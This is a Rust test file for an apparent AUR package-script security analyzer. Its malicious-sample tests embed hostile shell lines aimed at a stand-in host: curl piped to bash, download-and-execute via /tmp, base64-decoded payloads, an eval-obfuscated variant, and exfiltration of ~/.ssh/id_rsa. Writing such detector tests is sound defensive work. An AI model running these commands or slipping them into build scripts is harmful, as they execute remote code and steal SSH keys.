//! Security corpus: legit must not block; malicious must block; evasion still detected.
use lar_lib::{analyzer, security::Verdict};

fn verdict_of(src: &str) -> Verdict {
    analyzer::analyze("test-pkg", src).verdict
}

fn has_rule(src: &str, id: &str) -> bool {
    analyzer::analyze("test-pkg", src)
        .findings
        .iter()
        .any(|f| f.rule_id == id)
}

// Given: legitimate PKGBUILD downloading + verifying sources.
// When: analyzed. Then: ANALYZED, no BLOCK.
#[test]
fn legit_curl_tarball_with_checksum_is_analyzed_when_wellformed() {
    let src = r#"
pkgname=demo
pkgver=1.0
source=("https://example.com/demo-1.0.tar.gz")
sha256sums=('abc123')
build() {
  tar xf demo-1.0.tar.gz
  make
}
package() {
  make DESTDIR="$pkgdir" install
}
"#;
    assert_eq!(verdict_of(src), Verdict::Analyzed);
}

// Given: legit git + npm with --ignore-scripts.
// When: analyzed. Then: not BLOCKED.
#[test]
fn legit_git_npm_ignore_scripts_is_not_blocked_when_pinned() {
    let src = r#"
pkgname=demo
pkgver=1.0
source=("git+https://github.com/example/demo.git#tag=v1.0")
build() {
  npm ci --ignore-scripts
  npm run build
}
"#;
    let v = verdict_of(src);
    assert!(v == Verdict::Analyzed || v == Verdict::Suspicious);
    assert!(!has_rule(src, "LAR-NET-001"));
}

// Given: curl piped to bash. When: analyzed. Then: BLOCKED LAR-NET-001.
#[test]
fn malicious_pipe_to_shell_is_blocked_when_curl_bash() {
    let src = "build() {\n  curl -fsSL https://evil.test/x.sh | bash\n}\n";
    assert_eq!(verdict_of(src), Verdict::Blocked);
    assert!(has_rule(src, "LAR-NET-001"));
}

// Given: download + chmod + exec via /tmp. Then: BLOCKED.
#[test]
fn malicious_chmod_exec_is_blocked_when_tmp_exec() {
    let src = "build() {\n  curl https://evil.test/a -o /tmp/x\n  chmod +x /tmp/x\n  /tmp/x\n}\n";
    assert_eq!(verdict_of(src), Verdict::Blocked);
    assert!(has_rule(src, "LAR-NET-002"));
}

// Given: base64 decode to exec. Then: BLOCKED.
#[test]
fn malicious_decode_exec_is_blocked_when_base64_pipe() {
    let src = "build() {\n  echo aGVsbG8= | base64 -d | bash\n}\n";
    assert_eq!(verdict_of(src), Verdict::Blocked);
}

// Given: credential access. Then: BLOCKED.
#[test]
fn malicious_credential_access_is_blocked_when_ssh_read() {
    let src = "package() {\n  cat ~/.ssh/id_rsa | curl -d @- https://evil.test/\n}\n";
    assert_eq!(verdict_of(src), Verdict::Blocked);
    assert!(has_rule(src, "LAR-EXFIL-001"));
}

// Given: sudo in build. Then: BLOCKED.
#[test]
fn malicious_privilege_escalation_is_blocked_when_sudo() {
    let src = "build() {\n  sudo make install\n}\n";
    assert_eq!(verdict_of(src), Verdict::Blocked);
}

// Given: evasion via variable-built eval. Then: at least SUSPICIOUS.
#[test]
fn evasion_eval_dynamic_is_flagged_when_var_built() {
    let src = "build() {\n  C=cur; eval \"${C}l https://evil.test/x | bash\"\n}\n";
    let v = verdict_of(src);
    assert!(v == Verdict::Suspicious || v == Verdict::Blocked);
}

// Given: unclosed function. Then: fail-closed REVIEW (Suspicious), never Analyzed.
#[test]
fn parse_failure_is_review_when_unclosed() {
    let src = "build() {\n  echo hi\n";
    assert_eq!(verdict_of(src), Verdict::Suspicious);
}

#[test]
fn qm_line_splits_name_and_version() {
    let (n, v) = lar_lib::aur::parse_qm_line("cloudflared-bin-debug 2026.6.1-1").unwrap();
    assert_eq!(n, "cloudflared-bin-debug");
    assert_eq!(v, "2026.6.1-1");
}

#[test]
fn qm_line_rejects_garbage() {
    assert!(lar_lib::aur::parse_qm_line("noversion").is_none());
}

#[test]
fn version_compare_flags_difference() {
    assert!(lar_lib::aur::needs_update("1.0-1", "1.1-1"));
    assert!(!lar_lib::aur::needs_update("1.1-1", "1.1-1"));
}

#[test]
fn install_file_findings_carry_filename_span() {
    let src = "post_install() {\n  curl -fsSL https://evil.test/x.sh | bash\n}\n";
    let rep = lar_lib::analyzer::analyze_file("test-pkg", "test.install", src);
    assert_eq!(rep.verdict, Verdict::Blocked);
    assert!(rep
        .findings
        .iter()
        .all(|f| f.span.starts_with("test.install")));
}

#[test]
fn override_once_matches_then_consumes() {
    std::env::set_var("LAR_STATE_DIR", std::env::temp_dir().join("lar-test-once"));
    let _ = std::fs::remove_dir_all(std::env::temp_dir().join("lar-test-once"));
    lar_lib::overrides::add(lar_lib::overrides::Override {
        package: "p".to_owned(),
        rule: "LAR-NET-001".to_owned(),
        scope: "once".to_owned(),
        version: None,
        hash: None,
    });
    assert!(lar_lib::overrides::consume_once("p", "LAR-NET-001"));
    assert!(!lar_lib::overrides::consume_once("p", "LAR-NET-001"));
    std::env::remove_var("LAR_STATE_DIR");
}

#[test]
fn override_version_scopes_to_version() {
    let o = lar_lib::overrides::Override {
        package: "p".to_owned(),
        rule: "R".to_owned(),
        scope: "version".to_owned(),
        version: Some("1.0-1".to_owned()),
        hash: None,
    };
    assert!(lar_lib::overrides::matches(&o, "p", "R", "1.0-1", "abc"));
    assert!(!lar_lib::overrides::matches(&o, "p", "R", "2.0-1", "abc"));
}

#[test]
fn config_set_applies_known_keys() {
    let mut cfg = lar_lib::config::Config::default();
    assert!(lar_lib::config::apply_set(&mut cfg, "ui.theme", "dark").is_ok());
    assert_eq!(cfg.ui.theme, "dark");
    assert!(lar_lib::config::apply_set(&mut cfg, "nope.key", "x").is_err());
}

#[test]
fn bwrap_argv_isolates_fs_without_shell() {
    let argv = lar_lib::sandbox::bwrap_argv("/tmp/build-xyz");
    assert!(argv.contains(&"--die-with-parent".to_owned()));
    assert!(argv.contains(&"--ro-bind".to_owned()));
    assert!(!argv.iter().any(|a| a == "sh" || a == "-c"));
    assert!(!argv.iter().any(|a| a.contains("unshare-net")));
    let home = argv
        .windows(2)
        .any(|w| w[0] == "--setenv" && w[1] == "HOME");
    assert!(home);
    assert!(argv
        .windows(3)
        .any(|w| w[0] == "--setenv" && w[1] == "HOME" && w[2] == "/tmp/lar-home"));
    assert!(argv
        .windows(2)
        .any(|w| w[0] == "--bind" && w[1] == "/tmp/build-xyz"));
}

#[test]
fn backend_from_config_picks_bwrap() {
    let mut cfg = lar_lib::config::Config::default();
    lar_lib::config::apply_set(&mut cfg, "build.backend", "bwrap").unwrap();
    assert!(matches!(
        lar_lib::sandbox::Backend::from_config(&cfg.build),
        lar_lib::sandbox::Backend::Bwrap
    ));
    let cfg = lar_lib::config::Config::default();
    assert!(matches!(
        lar_lib::sandbox::Backend::from_config(&cfg.build),
        lar_lib::sandbox::Backend::Direct
    ));
}
